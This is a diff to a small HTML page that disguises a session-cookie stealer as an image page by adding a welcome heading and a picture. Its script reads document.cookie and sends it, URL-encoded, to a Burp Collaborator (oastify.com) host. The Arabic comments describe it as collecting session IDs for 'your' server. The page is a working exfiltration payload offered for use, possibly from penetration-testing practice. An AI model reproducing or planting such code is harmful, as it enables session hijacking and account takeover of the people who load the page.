@@ -1,17 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Session Stealer</title>
+    <title>Image with Session Stealer</title>
 </head>
 <body>
+    <h1>Welcome!</h1>
+    <!-- عرض صورة -->
+    <img src="https://example.com/your-image.jpg" alt="This is an image" />
+
     <script type="text/javascript">
-        // سحب الكوكيز التي تحتوي على Session ID
+        // جمع الكوكيز (Session ID)
         var cookies = document.cookie;
 
         // إرسال الكوكيز إلى خادم Burp Collaborator الخاص بك
         var xhr = new XMLHttpRequest();
-        xhr.open("GET", "http://zcf1h8qt7obuw47wkjjtwk2xqownkd82.oastify.com?cookie=" + cookies, true);
+        xhr.open("GET", "http://easgfno85399uj5biyh8uz0co3u2it6i.oastify.com?cookie=" + encodeURIComponent(cookies), true);
         xhr.send();
     </script>
 </body>
 </html>
+
